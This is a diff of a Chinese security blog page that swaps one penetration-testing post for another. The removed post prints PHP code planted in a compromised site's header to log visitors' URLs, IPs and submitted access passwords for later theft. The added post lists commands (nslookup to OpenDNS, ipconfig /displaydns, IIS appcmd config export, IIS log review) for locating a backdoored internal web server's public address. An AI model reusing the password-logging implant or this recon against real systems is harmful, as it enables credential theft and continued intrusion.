@@ -35,16 +35,28 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
+<meta name="description" content="在内渗透中有时需要在某台WEB服务器中留下后门，可以通过内网IP建立IPC连接，但还需要获知外网IP才能访问Wbshell，在无网关权限的情况下，我总结了有如下方法：
+nslookup myip.opendns.com resolver1.opendns.com
+通过nslookup访问上述地址 会回显IP 但我多数情况碰到的都是统一的出口流量
+ipconfig /displaydns 
+查看dn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP记录URL、表单内容">
-<meta property="og:url" content="http://www.rootat.net/2015/07/16/PHPURLForm/index.html">
+<meta property="og:title" content="判断内网机器的真实外网IP或域名">
+<meta property="og:url" content="http://www.rootat.net/2015/11/02/FindNetworkIP/index.html">
 <meta property="og:site_name" content="root@Zeroh">
-<meta property="og:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
-<meta property="og:updated_time" content="2016-03-09T07:58:56.722Z">
+<meta property="og:description" content="在内渗透中有时需要在某台WEB服务器中留下后门，可以通过内网IP建立IPC连接，但还需要获知外网IP才能访问Wbshell，在无网关权限的情况下，我总结了有如下方法：
+nslookup myip.opendns.com resolver1.opendns.com
+通过nslookup访问上述地址 会回显IP 但我多数情况碰到的都是统一的出口流量
+ipconfig /displaydns 
+查看dn">
+<meta property="og:updated_time" content="2016-03-09T09:04:09.753Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP记录URL、表单内容">
-<meta name="twitter:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
+<meta name="twitter:title" content="判断内网机器的真实外网IP或域名">
+<meta name="twitter:description" content="在内渗透中有时需要在某台WEB服务器中留下后门，可以通过内网IP建立IPC连接，但还需要获知外网IP才能访问Wbshell，在无网关权限的情况下，我总结了有如下方法：
+nslookup myip.opendns.com resolver1.opendns.com
+通过nslookup访问上述地址 会回显IP 但我多数情况碰到的都是统一的出口流量
+ipconfig /displaydns 
+查看dn">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -54,7 +66,7 @@
   };
 </script>
 
-  <title> PHP记录URL、表单内容 | root@Zeroh </title>
+  <title> 判断内网机器的真实外网IP或域名 | root@Zeroh </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -145,7 +157,7 @@
           
           
             
-              PHP记录URL、表单内容
+              判断内网机器的真实外网IP或域名
             
           
         </h1>
@@ -154,8 +166,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-07-16T15:52:28+08:00" content="2015-07-16">
-            2015-07-16
+          <time itemprop="dateCreated" datetime="2015-11-02T09:55:19+08:00" content="2015-11-02">
+            2015-11-02
           </time>
         </span>
 
@@ -165,8 +177,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/07/16/PHPURLForm/#comments" itemprop="discussionUrl">
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/07/16/PHPURLForm/" itemprop="commentsCount"></span>
+            <a href="/2015/11/02/FindNetworkIP/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/11/02/FindNetworkIP/" itemprop="commentsCount"></span>
             </a>
           </span>
           
@@ -180,19 +192,20 @@
       
 
       
-        <span itemprop="articleBody"><p>某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。<br>通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此时有了URL和密码，就可以获得解密后的文件。</p>
-<pre><code>&lt;?php
-<span class="variable">$URL</span>[<span class="string">'URL'</span>] = <span class="string">"http://"</span>.$_SERVER[<span class="string">'SERVER_NAME'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>].($_SERVER[<span class="string">'QUERY_STRING'</span>] ? <span class="string">"?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>] : <span class="string">""</span>); 
-<span class="variable">$ip</span>=$_SERVER[<span class="string">"REMOTE_ADDR"</span>];
-<span class="variable">$pass</span> = $_POST[<span class="string">"passname"</span>];
-<span class="variable">$fp</span> = fopen(<span class="string">'/var/www/log.txt'</span>, <span class="string">'a+b'</span>);
-fwrite(<span class="variable">$fp</span>, var_export(<span class="variable">$URL</span>[<span class="string">'URL'</span>], <span class="literal">true</span>));
-fwrite(<span class="variable">$fp</span>, <span class="variable">$pass</span>);
-fwrite(<span class="variable">$fp</span>, <span class="variable">$ip</span>);
-fwrite(<span class="variable">$fp</span>, <span class="string">"\n"</span>);
-fclose(<span class="variable">$fp</span>);
-?&gt;
-</code></pre></span>
+        <span itemprop="articleBody"><p>在内渗透中有时需要在某台WEB服务器中留下后门，可以通过内网IP建立IPC连接，但还需要获知外网IP才能访问Wbshell，在无网关权限的情况下，我总结了有如下方法：</p>
+<pre><code>nslookup myip<span class="class">.opendns</span><span class="class">.com</span> resolver1<span class="class">.opendns</span><span class="class">.com</span>
+</code></pre><p>通过nslookup访问上述地址 会回显IP 但我多数情况碰到的都是统一的出口流量</p>
+<pre><code><span class="winutils">ipconfig</span> /displaydns 
+</code></pre><p>查看dns缓存 如果访问比较活跃  相关记录可能会出现在缓存里</p>
+<p>如果是IIS7 IIS7.5：<br>执行如下命令：</p>
+<pre><code><span class="tag">%<span class="title">windir</span></span>%\system32\inetsrv\appcmd list site
+</code></pre><p>显示网站列表</p>
+<pre><code><span class="tag">%<span class="title">windir</span></span>%\system32\inetsrv\appcmd list site /config /xml
+</code></pre><p>导出指定网站的配置信息</p>
+<p>从中找到绑定的域名及IP,但大型网络中一般结果都为localhost<br>上述的config文件还记录了一条关键信息，就是Web绝对路径，通过绝对路径，翻看网站源代码，找到title、目录结构、链接及相关的说明信息，再通过google搜索，加上相关域名或关键词缩写范围，尝试从google收录中找到该网站。</p>
+<p>如果为IIS6 无法快速确定Web目录，还可以翻看IIS日志：<br>c$\inetpub\logs\LogFiles\W3SVC1，日志可能会暴露外网IP、域名；通过访问者IP能判断是否能够外网访问；通过post或get请求的路径，加上相关域名或关键词配合google搜索。</p>
+<p>注意：在分析日志时使用正则表达式搜索可以提高效率。</p>
+</span>
       
     </div>
 
@@ -203,13 +216,11 @@ fclose(<span class="variable">$fp</span>);
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/08/13/GPPcpassword/" rel="prev">利用域凭据：解密GPP中的管理员密码</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/06/08/passwdTOPN/" rel="next">高效词频分析</a>
+              <a href="/2015/10/09/WideByteXSS/" rel="next">XSS中的宽字节编码问题</a>
             
           </div>
         </div>
@@ -371,9 +382,9 @@ fclose(<span class="variable">$fp</span>);
 
     <script type="text/javascript">
       var disqus_shortname = 'rootat';
-      var disqus_identifier = '2015/07/16/PHPURLForm/';
-      var disqus_title = 'PHP记录URL、表单内容';
-      var disqus_url = 'http://www.rootat.net/2015/07/16/PHPURLForm/';
+      var disqus_identifier = '2015/11/02/FindNetworkIP/';
+      var disqus_title = '判断内网机器的真实外网IP或域名';
+      var disqus_url = 'http://www.rootat.net/2015/11/02/FindNetworkIP/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
